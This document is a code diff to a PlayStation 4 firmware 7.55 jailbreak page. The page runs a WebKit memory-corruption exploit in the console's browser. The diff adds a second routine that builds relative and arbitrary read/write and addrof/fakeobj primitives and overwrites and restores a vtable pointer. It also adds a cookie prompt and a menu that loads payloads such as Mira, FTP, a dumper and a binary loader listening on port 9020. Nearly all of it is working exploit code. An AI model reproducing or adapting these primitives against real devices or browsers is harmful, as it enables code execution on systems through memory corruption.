@@ -43,6 +43,7 @@ var g_round = 1;
 var g_input = null;
 
 var guess_htmltextarea_addr = new Int64("0x2031b00d8");
+var isJB = null;
 
 
 /* Executed after deleteBubbleTree */
@@ -113,25 +114,88 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	//debug_log("-> Succesfully got addrof/fakeobj");
-	debug_log("Exploited Successfully");
-
-	setTimeout(function(){document.getElementById("progress").innerHTML="PS4 Jailbreak 7.5X";}, 3500);
-
+	debug_log("Exploit Successful !! Loading JB.. Refresh page once you get waiting for clients..");
 	/* Getting code execution */
 	/* ... */
+	if(window.postExploit)
+		window.postExploit();
+}
+
+/* Executed after deleteBubbleTree */
+function setupRW_mod() {
+	/* Now the m_length of the JSArrayBufferView should be 0xffffff01 */
+	for (let i = 0; i < g_arr_ab_3.length; i++) {
+		if (g_arr_ab_3[i].length > 0xff) {
+			g_relative_rw = g_arr_ab_3[i];
+			debug_log("-> Succesfully got a relative R/W");
+			break;
+		}
+	}
+	if (g_relative_rw === null)
+		die("[!] Failed to setup a relative R/W primitive");
+
+	debug_log("-> Setting up arbitrary R/W");
+
+	/* Retrieving the ArrayBuffer address using the relative read */
+	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
+	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));
+
+	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
+	let ab_index = g_jsview_leak.sub(ab_addr).low32();
+	if (g_relative_rw[ab_index + LENGTH_JSVIEW + OFFSET_JSAB_VIEW_LENGTH] === LENGTH_ARRAYBUFFER)
+		g_ab_index = ab_index + LENGTH_JSVIEW;
+	else
+		g_ab_index = ab_index - LENGTH_JSVIEW;
+
+	/* Overding the length of one JSArrayBufferView with a known value */
+	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0x41;
+
+	/* Looking for the slave JSArrayBufferView */
+	for (let i = 0; i < g_arr_ab_3.length; i++) {
+		if (g_arr_ab_3[i].length === 0x41) {
+			g_ab_slave = g_arr_ab_3[i];
+			g_arr_ab_3 = null;
+			break;
+		}
+	}
+	if (g_ab_slave === null)
+		die("[!] Didn't found the slave JSArrayBufferView");
+
+	/* Extending the JSArrayBufferView length */
+	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0xff;
+	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 1] = 0xff;
+	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
+	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;
+
+	debug_log("-> Testing arbitrary R/W");
+
+	let saved_vtable = read64(guess_htmltextarea_addr);
+	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
+	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
+		die("[!] Failed to setup arbitrary R/W primitive");
+
+
+	/* Restore the overidden vtable pointer */
+	write64(guess_htmltextarea_addr, saved_vtable);
+
+	/* Cleanup memory */
+	cleanup();
+
+	/* Set up addrof/fakeobj primitives */
+	g_ab_slave.leakme = 0x1337;
+	var bf = 0;
+	for(var i = 15; i >= 8; i--)
+		bf = 256 * bf + g_relative_rw[g_ab_index + i];
+	g_jsview_butterfly = new Int64(bf);
+	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
+		die("[!] Failed to setup addrof/fakeobj primitives");
+	
+	debug_log("Exploit Successful !!");
+	setTimeout(function(){document.getElementById("progress").innerHTML="PS4 Jailbreak 7.55";}, 1500);
 	document.getElementById("myProgress").remove();
 	document.getElementById('load').innerHTML='<tr>'+
 			'<td align="center" colspan="2" >'+
-			'<a href="#" class="button" onclick="toggle_payload(\'binloader\'); return false" style="width:100%">Bin Loader</a>&nbsp;'+
-			'</td>'+
-			'</tr>'+
-			'<tr><td><br/></td></tr>';
-			/*'<tr>'+
-			'<td align="center" colspan="2" >'+
-			'<a href="#" id="hen" class="button" onclick="toggle_payload(\'mira\'); return false" style="width:28%">Mira</a>&nbsp;'+
-			'<a href="#" id="henb" class="button" onclick="toggle_payload(\'henb\'); return false" style="width:28%">HEN 2.1.3 b</a>&nbsp;'+
-			'<a href="#" id="spoof" class="button" onclick="toggle_payload(\'spoof\'); return false" style="width:28%">Spoof 9.99</a>&nbsp;'+
+			'<a href="#" id="mira" class="button" onclick="toggle_payload(\'mira\'); return false" style="width:89%">MIRA</a>&nbsp;'+
 			'</td>'+
 			'</tr>'+
 			'<tr><td><br/></td></tr>'+
@@ -148,38 +212,64 @@ function setupRW() {
 			'</tr><tr><td><br/></td></tr>'+
 			'<tr>'+
 			'<td align="center" colspan="2"><a href="#" id="dumper" class="button" onclick="toggle_payload(\'dumper\'); return false" style="width:43%">Dumper</a>&nbsp;'+
-			'<a href="#" id="gtam132" class="button" onclick="toggle_payload(\'gtam132\'); return false" style="width:43%">GTAV M1 1.32</a>&nbsp;</td>'+
+			'<a href="#" id="ftp" class="button" onclick="toggle_payload(\'ftp\'); return false" style="width:43%">FTP</a>&nbsp;</td>'+
 			'</tr><tr><td><br/></td></tr>'+
 			'<tr>'+
 			'<tr>'+
 			'<td align="center" colspan="2">'+
+			'<a href="#" id="backup" class="button" onclick="toggle_payload(\'backup\'); return false" style="width:43%">Backup</a>&nbsp;'+
 			'<a href="#" id="restore" class="button" onclick="toggle_payload(\'restore\'); return false" style="width:43%">Restore</a>&nbsp;'+
-			'<a href="#" id="fix30391" class="button" onclick="toggle_payload(\'fix30391\'); return false" style="width:43%;border-radius: 5px 0px 0px 5px;">CE-30391-6 Fix</a>&nbsp;'+
 			'</td>'+
 			'</tr><tr><td><br/></td></tr>'+
 			'<tr>'+
-			'<td align="center" colspan="2"><a href="#" id="ftp" class="button" onclick="toggle_payload(\'ftp\'); return false" style="width:43%">FTP</a>&nbsp;'+
-			'<a href="#" id="backup" class="button" onclick="toggle_payload(\'backup\'); return false" style="width:43%">BackUp</a>&nbsp;</td>'+
+			'<td align="center" colspan="2"><a href="#" id="renamer" class="button" onclick="toggle_payload(\'renamer\'); return false" style="width:43%">Renamer</a>&nbsp;'+
+			'<a href="#" id="todex" class="button" onclick="toggle_payload(\'todex\'); return false" style="width:43%">To-Dex</a>&nbsp;</td>'+
 			'</tr><tr><td><br/></td></tr>'+
-			'<tr>'+
-			'<td align="center" colspan="2"><a href="#" id="todex" class="button" onclick="toggle_payload(\'todex\'); return false" style="width:43%">To-DEX</a>&nbsp;'+
-			'<a href="#" id="webrte" class="button" onclick="toggle_payload(\'webrte\'); return false" style="width:43%">WebRTE</a>&nbsp;</td>'+
-			'</tr><tr><td><br/></td></tr>'+
-			'<tr>'+
-			'<td align="center" colspan="2"><a href="#" id="linuxloader" class="button" onclick="toggle_payload(\'linuxloader\'); return false" style="width:43%">Linux Loader</a>&nbsp;'+
-			'<a href="#" id="ps4debug" class="button" onclick="toggle_payload(\'ps4debug\'); return false" style="width:43%">PS4 Debug</a>&nbsp;</td>'+
-			'</tr>';*/
+			'<tr>';
 	document.getElementById("div1").remove();
-
 }
 
 function toggle_payload(pld){
 	if(pld == "binloader"){
-		preloadScripts(['blob.js', 'jb.js', 'netcat.js'], go);
 		document.getElementById("progress").innerHTML="Awaiting Payload.. Send Payload to port 9020..";
-		if(window.postExploit)
-			window.postExploit();
+		preloadScripts(['blob.js', 'jb.js', 'netcat.js']);
+	}else if(pld == "mira"){
+		document.getElementById("progress").innerHTML="Loading MIRA.. Please wait..";
+		preloadScripts(['blob.js', 'jb.js', 'mira.js', 'mira2.js', 'netcat.js']);
+	}else if(pld == "ftp"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['blob.js', 'jb.js', 'mira.js', 'ftp.js', 'netcat.js']);
+	}else if(pld == "app2usb"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['blob.js', 'jb.js', 'mira.js', 'app2usb.js', 'netcat.js']);
+	}else if(pld == "disableupdates"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['blob.js', 'jb.js', 'mira.js', 'disableupdates.js', 'netcat.js']);
+	}else if(pld == "enableupdates"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['blob.js', 'jb.js', 'mira.js', 'enableupdates.js', 'netcat.js']);
+	}else if(pld == "backup"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['blob.js', 'jb.js', 'mira.js', 'backup.js', 'netcat.js']);
+	}else if(pld == "restore"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['blob.js', 'jb.js', 'mira.js', 'restore.js', 'netcat.js']);
+	}else if(pld == "renamer"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['blob.js', 'jb.js', 'mira.js', 'renamer.js', 'netcat.js']);
+	}else if(pld == "todex"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['blob.js', 'jb.js', 'mira.js', 'todex.js', 'netcat.js']);
+	}else if(pld == "dumper"){
+		document.getElementById("progress").innerHTML="Loading Payload.. Please wait..";
+		preloadScripts(['blob.js', 'jb.js', 'mira.js', 'dumper.js', 'netcat.js']);
 	}
+	load_payload();
+}
+
+function load_payload(){
+	if(window.postExploit)
+		window.postExploit();
 }
 
 function read(addr, length) {
@@ -242,8 +332,11 @@ function confuseTargetObjRound2() {
 		die("[!] Failed to reuse target obj.");
 
 	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
-
-	setTimeout(setupRW, 6000);
+	if(String(isJB) == "true"){
+		setTimeout(setupRW, 6000);
+	}else{
+		setTimeout(setupRW_mod, 6000);
+	}
 }
 
 
@@ -503,9 +596,33 @@ function go() {
 	if(localStorage.is755Cached){
 		/* Init spray */
 		sprayHTMLTextArea();
-
+		isJB = getCookie("Jailbreak");
+		if(isJB == ""){
+			isJB = confirm("Do you want to run Jailbreak?\nNote: Click 'Cancel' if you have already ran this after booting!!\nNote: Required to run Payloads\nNote: Not Required for running Binloader");
+			document.cookie="Jailbreak="+isJB;
+		}
+		if(String(isJB) == "true"){
+			if(window.miraloader)
+				window.miraloader();
+		}
 		g_input = input1;
 		/* Shape heap layout for obj. reuse */
 		prepareUAF();
 	}
-} 
+}
+
+function getCookie(cname) {
+  var name = cname + "=";
+  var decodedCookie = decodeURIComponent(document.cookie);
+  var ca = decodedCookie.split(';');
+  for(var i = 0; i <ca.length; i++) {
+    var c = ca[i];
+    while (c.charAt(0) == ' ') {
+      c = c.substring(1);
+    }
+    if (c.indexOf(name) == 0) {
+      return c.substring(name.length, c.length);
+    }
+  }
+  return "";
+}
